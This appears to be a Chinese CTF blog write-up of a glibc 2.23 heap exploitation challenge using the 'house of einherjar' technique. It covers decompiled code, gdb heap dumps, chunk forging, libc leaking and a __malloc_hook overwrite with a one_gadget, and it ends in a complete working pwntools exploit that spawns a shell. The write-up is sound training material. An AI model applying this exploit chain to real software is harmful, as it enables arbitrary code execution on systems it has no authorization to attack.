# pwnhub-einherjar-level1

https://iyheart.github.io/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/index.html

## house of einherjar_level_1

- 题目来源：CTFhub的house of einherjar，题目环境是glibc2.23，但是为了方便动态调试，我就使用ubuntu22.04，即glibc2.35版本，之后动态调试查看fd指针的时候才会使用glibc2.23的环境，因为高版本的glibc存储fd的指针的值为进行异或加密
- 这题在2月2号尝试打了一下，但是由于题打太少了，思维给实验的那种利用方式给限制了，这题并不是在bss段或者是栈上伪造堆块，而是构造堆叠，进行堆排布。（但是收获还是有的，弄好了docker环境中的gdb调试）
- 今天2月3号打算再来尝试一下这题（找了好半天看了wp之后才知道要用堆叠，并且这题还要用到malloc_hook，打完这题马上就学malloc_hook）
- 这题本地打一下就行，打远程还是有点问题

### level_1_分析1

- 接下来检查一下程序的保护机制，发现保护开的很全，这时候就

image-20250202214905045

```text
checksec
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
Fortify:  Enabled
Arch:     amd64-64-little
```

- 接下来将该程序拖入IDA对该程序进行逆向分析，同时配合程序的运行，这样可以更好的理清程序的运行逻辑
- 先来查看一下main函数的大致逻辑
  - 先是init对该程序进行输入输出初始化，让该程序无缓冲输入，但是标准输出好像不是无缓冲输出
  - 接下来打印menu菜单，1.create、2.show、3delete、4.edit、5.exit
接下来就是让用户输入选项，输入选项之后就进入用户所选择选项的相应函数

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+24h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf(&unk_10C8, &v3);
      if ( v3 != 1 )
        break;
      add();
    }
    switch ( v3 )
    {
      case 3:
        delete();
        break;
      case 2:
        show();
        break;
      case 4:
        edit();
        break;
      case 5:
        puts("See you tomorrow~");
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
}
```

接下来查看add()函数
先让用户输入ID，也就是申请堆块返回地址存储的索引
然后让用户输入size_long，也就是所要申请堆块的大小
经过判断后，满足条件就调用malloc()函数申请用户指定的堆块大小，并将返回的堆块地址存储到chunk数组中
之后将size_long存储在size中

```c
int add()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-14h] BYREF
  int v2; // [rsp+10h] [rbp-10h] BYREF
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Give me a book ID: ");
  __isoc99_scanf(&unk_10C8, &v2);
  printf("how long: ");
  __isoc99_scanf(&unk_10C8, &v1);
  result = v2;
  if ( v2 >= 0 )
  {
    result = v2;
    if ( v2 <= 49 )
    {
      if ( v1 < 0 )
      {
        return puts("too large!");
      }
      else
      {
        v3 = v2;
        chunk[v3] = malloc(v1);
        size[v3] = v1;
        return puts("Done!\n");
      }
    }
  }
  return result;
}
```

现在来查看delete()函数
让用户输入book的ID
之后使用free()函数释放指定ID的堆块
之后还将存储释放堆块的地址置0所以不存在UAF漏洞

```c
__int64 delete()
{
  unsigned int v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0;
  puts("Which one to throw?");
  __isoc99_scanf(&unk_10C8, &v1);
  if ( v1 <= 0x32 )
  {
    free((void *)chunk[v1]);
    chunk[v1] = 0;
    return (unsigned int)puts("Done!\n");
  }
  else
  {
    return (unsigned int)puts("Wrong!\n");
  }
}
```

接下来就查看show函数
将用户指定的堆块内容输出到屏幕上，这边还存在着数组越界引用的漏洞。（这个数组越界引用的漏洞并没有什么用好像）
最多就是利用%s这个字符串格式化对堆块的地址进行泄露

```c
unsigned __int64 show()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Which book do you want to show?");
  __isoc99_scanf(&unk_10C8, &v1);
  printf("Content: %s", (const char *)chunk[v1]);
  return __readfsqword(0x28u) ^ v2;
}
```

接下来查看edit()这个函数
在这里先会读取上一次申请堆块的大小
之后我们选择要edit的堆块ID
之后就向我们指定的堆块中写入数据
注意由于我们读取的是上一次操作堆块的大小，所以与我们所指定的堆块大小无关，这就可能造成堆溢出的操作。（这个程序逻辑需要动态调试和认真读汇编代码才能理清楚代码逻辑）
假如我们在edit之前申请堆块ID为14，这时我们edit的size就是ID14的size。当我们在edit之前是释放ID为10的堆块，这时我们edit的size就是ID为10的堆块的size

```c
int edit()
{
  int v1; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v2 = size[v1];
  printf("Which book to write?");
  __isoc99_scanf(&unk_10C8, &v1);
  if ( chunk[v1] )
  {
    printf("Content: ");
    read(0, (void *)chunk[v1], (unsigned int)(v2 + 1));
    return puts("Done!\n");
  }
  else
  {
    printf("wrong!");
    return 0;
  }
}

```

我们在.bss段中发现了全局变量number，但是这个number在程序运行过程中没有被使用，这个全局变量就很可能是用来伪造堆块

image-20250203012043439

```text
IDA .bss
; 全局未使用变量
number dq 0
```

### level_1_分析2

- 现在进行gdb动态调试，这时候我们这边有一个堆溢出，这样我们可以通过堆风水对堆进行巧妙的排布，然后再通过堆溢出，最后使用edit()函数就可以泄露出堆地址。但是泄露完这个堆地址后并没有什么用 ，因为我们没办法对.bss段的地址或者栈上的地址，使用这种利用方式是行不通的。
- 那么我们就直接利用unlink机制，两个堆unlink后，堆块就会被放入unsorted_bin，由于unsorted_bin是双向链表，这样我们就可以利用这个链表指针，通过edit()函数将libc的地址泄露出来。接下来我们进行动态调试。这样我们就要先使用house_of_einherjar堆块伪造技术，对堆块进行堆叠。
- 由于后申请的堆块处于更高地址，最后申请的堆块与topchunk相邻，为了不让合并后的堆块与top_chunk合并，我们在申请我们所需要理由的堆块后最后还要申请一个堆块，用于阻隔合并后的堆块和top_chunk。（并且这个堆块要的size要比之前的大一点，这样我们才能够进行堆溢出操作。）
- 注意：house of einherjar利用的是堆块的后向合并，这时我们要修改低地址的堆块为空闲堆块，再free高地址的堆块所以这个堆块的prev_inuse位就需要为1。这时我们需要绕过unlink的检查机制

```c
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
```

- 这时我们就需要泄露chunk的地址，这时我们就要先泄露堆块的地址，我们先创建一个堆块ID6，大小为0x10用于堆溢出，然后我们再申请两个堆块ID7、ID8大小都为0x20，最后防止被释放的堆块合并top我们再申请一个堆块ID9大小为0x40

image-20250204103526930

```text
pwndbg> heap
Allocated chunk | PREV_INUSE   (ID6)
Allocated chunk | PREV_INUSE   (ID7)
Allocated chunk | PREV_INUSE   (ID8)
Allocated chunk | PREV_INUSE   (ID9)
Top chunk       | PREV_INUSE
```

- 这时我们先释放ID8的堆块（后申请的堆块），再释放ID7的堆块（先申请的堆块）。这两个堆块就放入了fastbin中，堆块ID7的fd指针会指向堆块ID8的prev_size_addr。

image-20250204103829572

| 层级 | 节点 | 备注 |
| --- | --- | --- |
| fastbin 头 | ID7 | fd 指向下一块 |
|  | ID8 | fd → NULL |

- 这时我们就可以通过溢出ID6，溢出到ID7的fd指针，再使用show()函数，打印出ID6堆块内容的同时就会将ID7的fd指针打内容打印出来，这样我们就可以泄露ID8的prev_size_addr的地址从而就可以泄露堆块的地址

image-20250204104159744

```text
pwndbg> x/20gx <ID7_addr>
...
0x????????????: 0x0000000000000000 0x0000000000000031
0x????????????: 0x0000000000000000 0x0000559a8cda7050  <-- fd → ID8->prev_size
...

Which book do you want to show?Content:
<泄露字节...>  ->  泄露出 ID7->fd 指向 ID8 的 prev_size 地址
```

- 这样我们就可以进行堆块溢出

image-20250204104256325

```text
pwndbg> vis
[fastbins(0x30)]  ID7(fd=0x...7050) -> ID8 -> NULL
```

image-20250204104621857

```text
pwndbg> fastbin
fastbins
0x30: 0x...7020 -> 0x...7050 -> 0x0
```

- 这样堆块的地址就可以被泄露出来了。
- 现在我们就可以开始伪造堆块，这样就可以进行house of einherjar的利用。结合利用原理，这时我们先要申请一个堆块ID0大小为0x10，这样我们就可以进行对高地址的的堆块进行溢出。然后我们要申请一个size位为0x100整数倍的堆块。所以我们申请一个堆块ID1大小为0xf8的堆块，然后我们再申请一个堆块ID2大小为0x10，用于另一个堆块的溢出。之后我们继续申请一个堆块ID3大小为0xf8的堆块。最后由于edit的堆块的size是调用上一个ID堆块的size，所以我们还要申请一个堆块ID4大小为0x40（这样我们在编辑堆块ID2的时候就可以进行溢出操作）。这时我们就要溢出修改ID3的prev_size和prev_inuse这两个位

image-20250204110202592

| 区块 | 字段 | 值 |
| --- | --- | --- |
| ID1 | size | 0x120 |
|  | 标志 | P=1, M=0, N=0 |
|  | fd/bk | 指向 `ID1_prev_size_addr` |
| ID2 | size | 0x20 |
|  | 标志 | P=0, M=0, N=0 |
| ID3(伪造) | prev_size | 0x120 |
|  | size | 0x100 |
|  | 标志 | P=0, M=0, N=0 |

image-20250204105936993

```text
pwndbg> x/60gx <ID3_header_addr>
...  0x0000000000000120  0x0000000000000100  ...   <-- prev_size=0x120, size=0x100
```

- 然后我们还要再申请一个堆块ID5大小为0x40，这样我们才能在修改ID0的时候发生溢出，从而修改ID1堆块的size位、fd、bk这三个

image-20250204110436095

```text
伪造 ID1 头部
size = 0x121
fd = bk = chunk1_addr

pwndbg> x/6gx <ID1_header_addr>
0x...: 0x0000000000000000 0x0000000000000121
0x...: 0x0000???????????? 0x0000????????????  <-- fd/bk = chunk1_addr
```

- 之后我们就可以释放堆块ID3这样我们就可以将该堆块释放，并且触发unlink进行后向合并，并且可以绕过unlink的检查机制，这样我们ID1、ID2、ID3就可以合并（其实是ID1和ID3合并）因为我们修改了size和prev_size。所以合并的时候就会连同ID2的堆块一起合并，放入unsorted_bin中。但是堆块ID2的地址还是保存在chunk[ID]数组中我们还可以对这个堆块进行show、edit操作，这时我们再申请一个堆块ID1大小为0xf8。

- 这时就会从unsorted_bin合并的堆块中分割0xf8大小。这时剩下的堆块，其fd、bk指针就恰好为堆块ID2中的fd、bk、由于unsorted_bin使用的是双向链表，此时的fd、bk指针就会被指向main_arena+88地址处，这时我们就可以show(ID2)从而泄露libc地址

image-20250204111611619

```text
pwndbg> unsortedbin
all: 0x... -> 0x7f... (main_arena+88) <- 0x...
```

image-20250204111718393

```text
main_area---> 0x7f8d59a98b78
```

### level_1_分析3

- 接下来我们就可以利用ID2这个堆块进行UAF漏洞，这样我们就可以通过堆风水构造double free，劫持malloc_hook和realloc_hook
我们可以通过这些来计算偏移

```python
libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook']
malloc_hook = libc_addr+libc.sym['__malloc_hook']
realloc_hook = libc_addr+libc.sym["realloc"]
```

- 接下来我们就构造double，这时我们需要去__malloc_hook找可以伪造的堆块。我们需要这样的堆块，使得我们double free从而之后申请到这个地址的堆块，从而可以修改__malloc_hook、realloc_hook的地址，从而劫持hook指针为onegadget这样去getshell。（虽然这个地址的size并不是0x70、0x71，但是在double free的时候这个堆块也会被放入fastbin链表中）

image-20250204112445476

```text
目标 fake_chunk = __malloc_hook - 0x23
```

- 接下来我们构造double free，我们现在就利用一个ID2去构造UAF，由于我们要劫持hook所要申请到的地址size位为0x7f，这样我们就要将其放入0x70的fastbin中。
- 所以我们先申请一个堆块ID10，大小为0x68，这样申请的堆块size才会为0x70。此时chunk[10]存储的堆地址与chunk[2]存储的堆地址是相同的。此时我们释放chunk[10]这个堆块，这样该堆块的就会被放入fastbin链表，该堆块的fd指针就会被启用，这时我们就使用edit()对chunk[2]修改，从而修改fd指针，使其指向 malloc_hook - 0x23

image-20250204115300128

```text
pwndbg> fastbin
fastbins
0x70: 0x... -> (__malloc_hook-0x23)
```

image-20250204115323936

```text
pwndbg> x/20gx (__malloc_hook-0x23)
0x... (__realloc_hook+5): 0x000000000000007f
<main_arena+13> ...
```

- 之后我们就先申请一个先申请一个ID11大小为0x68，然后我们再申请一个堆块ID13这样我们就可以将malloc_hook-0x23的这个堆块地址申请回来，然后我们可以修改malloc_hook为realloc+16、改realloc_hook为ogg+6。
- 此时我们的ogg为如下，这里我们ogg+6的原因是，当我们直接hook到ogg的时候rcx不是一个正常地址，会导致段错误，所以我就ogg+6直接不执行某个汇编代码，这样就不会出现段错误

image-20250204115905883

```text
one_gadget ./libc-2.23.so
0x45216 execve("/bin/sh", rsp+0x30, environ)
  constraints:
    rax == NULL
0x4526a execve("/bin/sh", rsp+0x30, environ)
  constraints:
    [rsp+0x30] == NULL
0xf02a4 execve("/bin/sh", rsp+0x50, environ)
  constraints:
    [rsp+0x50] == NULL
0xf1147 execve("/bin/sh", rsp+0x70, environ)
  constraints:
    [rsp+0x70] == NULL
```

- 之后我们再创建一个堆块，触发调用malloc，这样就可以触发malloc_hook,从而getshell

image-20250204120113958

```text
$ ls
exp2.py  exp.py  lab  lab1  lab.c  pwn  test  test.c
$
```

### level_1_exp

exp如下：

```python
import os
import sys
from pwn import *
context.terminal = ["tmux", "neww"]
p = process('./pwn')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level='debug'
def create(ID,size):
    p.sendline(b'1')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(str(size).encode('utf-8'))

def show(ID):
    p.sendline(b'2')
    p.sendline(str(ID).encode('utf-8'))

def dele(ID):
    p.sendline(b'3')
    p.sendline(str(ID).encode('utf-8'))

def edit(ID,content):
    p.sendline(b'4')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(content)

create(6,0x10)
create(7,0x20)
create(8,0x20)
create(9,0x40)
#gdb.attach(p)
dele(8)
dele(7)
payload = b'a'*0x1f
edit(6,payload)
show(6)
p.recvuntil(b'to show?Content:')
p.recvline()
chunk_addr = p.recvline()[:-1]
print('chunk_addr----->',chunk_addr)
chunk_addr = int.from_bytes(chunk_addr,'little')
chunk_addr = chunk_addr - 0x50
create(0,0x10)
create(1,0xf8)
create(2,0x10)
create(3,0xf8)
create(4,0x40)
# 溢出修改ID3
chunk1_addr = chunk_addr + 0x20+0x30+0x30+0x50+0x20
chunk3_addr = chunk_addr + 0x20+0x30+0x30+0x50+0x20+0x120
payload = b'a'*0x10+p64(0x120)+p64(0x100)#+p64(chunk1_addr)+p64(chunk1_addr)
edit(2,payload)
# 溢出修改ID1
create(5,0x40)
payload = b'a'*0x10+p64(0)+p64(0x121)+p64(chunk1_addr)+p64(chunk1_addr)
edit(0,payload)

dele(3)
create(1,0xf8)
show(2)
p.recvuntil(b'to show?Content: ')
main_area = p.recvline()[:-1]
main_area = int.from_bytes(main_area,'little')
print('main_area--->',hex(main_area))
libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook']
malloc_hook = libc_addr+libc.sym['__malloc_hook']
realloc_hook = libc_addr+libc.sym["realloc"]
fake_chunk = malloc_hook - 0x23
ogg = [0x45216,0x4526a,0xf02a4,0xf1147]
ogg = libc_addr + ogg[1]+6
#gdb.attach(p)
#pause()
create(10,0x68)
dele(10)
edit(2,p64(fake_chunk))
create(11,0x68)
#create(12,0xf0)
create(13,0x68)
edit(13,b'a'*3+p64(0)+p64(ogg)+p64(realloc_hook+16))
#gdb.attach(p)
create(14,20)
#gdb.attach(p)
p.interactive()                                        
```
